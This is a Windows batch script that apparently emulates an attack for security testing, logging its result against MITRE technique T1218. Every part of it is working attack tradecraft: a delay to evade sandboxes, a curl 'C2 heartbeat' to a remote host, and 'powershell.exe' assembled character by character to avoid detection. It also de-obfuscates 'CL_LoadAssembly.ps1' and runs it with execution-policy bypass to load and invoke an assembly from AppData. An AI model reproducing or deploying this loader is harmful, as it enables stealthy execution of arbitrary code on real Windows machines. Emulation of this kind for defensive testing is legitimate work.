@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ placeholder assignments
SET aqwsxd=%APPDATA%\8655\cb2dbe8a
SET bgyhnm=https://10.0.0.49
SET cdfvbg=https://10.0.0.49/stage/2/icon.png?8655-7
SET ewqzxc=ITZEL-S2BO
SET fghjkl=7
SET hjklyu=onenote.txt
SET ioplkj=8655

REM Setup variables
SET logf=%APPDATA%\!fghjkl!\macula-simulations.log
SET agentv=!ewqzxc!

REM Initial sandbox delay
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!agentv!]: delay_complete=45s>> "!logf!" 2>nul

REM C2 heartbeat (mandatory, non-obfuscated)
echo [!DATE! !TIME!][DEBUG][!agentv!]: heartbeat_start=begin>> "!logf!" 2>nul
curl -k -s -o nul "!cdfvbg!"
echo [!DATE! !TIME!][DEBUG][!agentv!]: heartbeat_complete=success>> "!logf!" 2>nul

ping -n 8 127.0.0.1 >nul

REM Change to target directory
echo [!DATE! !TIME!][DEBUG][!agentv!]: chdir_start=C:\Windows\diagnostics\system\Audio>> "!logf!" 2>nul
cd /d C:\Windows\diagnostics\system\Audio >nul
echo [!DATE! !TIME!][DEBUG][!agentv!]: chdir_complete=success>> "!logf!" 2>nul

REM Random delay
SET /A delay=%RANDOM% %% 15 + 5
timeout /t !delay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!agentv!]: delay_random=!delay!s>> "!logf!" 2>nul

REM Build powershell.exe character by character
SET c1=p
SET c2=o
SET c3=w
SET c4=e
SET c5=r
SET c6=s
SET c7=h
SET c8=e
SET c9=l
SET c10=l
SET psh=%c1%%c2%%c3%%c4%%c5%%c6%%c7%%c8%%c9%%c10%.exe

REM Build CL_LoadAssembly.ps1 string substitution
SET modstr=ZQ_LoadYssembly.qs1
SET modstr=!modstr:Z=C!
SET modstr=!modstr:Q=L!
SET modstr=!modstr:Y=A!
SET modstr=!modstr:q=p!
SET modstr=!modstr:s=!
REM modstr now contains "CL_LoadAssembly.ps1"

REM Execute assembly via obfuscated command
echo [!DATE! !TIME!][DEBUG][!agentv!]: assembly_execute_start=!hjklyu!>> "!logf!" 2>nul

SET ttp_result=0
SET ttp_error=

!psh! -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\!modstr!; LoadAssemblyFromPath !aqwsxd!\\!hjklyu!;[Program]::Dale()" >nul 2>&1

IF !ERRORLEVEL! EQU 0 (
    SET ttp_result=1
    SET ttp_error=
    echo [!DATE! !TIME!][DEBUG][!agentv!]: assembly_execute_complete=success>> "!logf!" 2>nul
) ELSE (
    SET ttp_error=assembly_load_failed
    echo [!DATE! !TIME!][DEBUG][!agentv!]: assembly_execute_complete=failed>> "!logf!" 2>nul
)

REM TTP logging for T1218
SET year=!DATE:~10,4!
SET month=!DATE:~4,2!
SET day=!DATE:~7,2!
SET ttp_ts=!year!-!month!-!day! !TIME:.=.!000
SET ttp_ts=!ttp_ts:~0,23!

echo [!ttp_ts!][!agentv!]: !fghjkl!-!ioplkj!-T1218|Signed Binary Proxy Execution=!ttp_result!:!ttp_error!>> "!logf!" 2>nul

CHOICE /C Y /N /D Y /T 12 >nul
echo [!DATE! !TIME!][DEBUG][!agentv!]: script_complete=end>> "!logf!" 2>nul

ENDLOCAL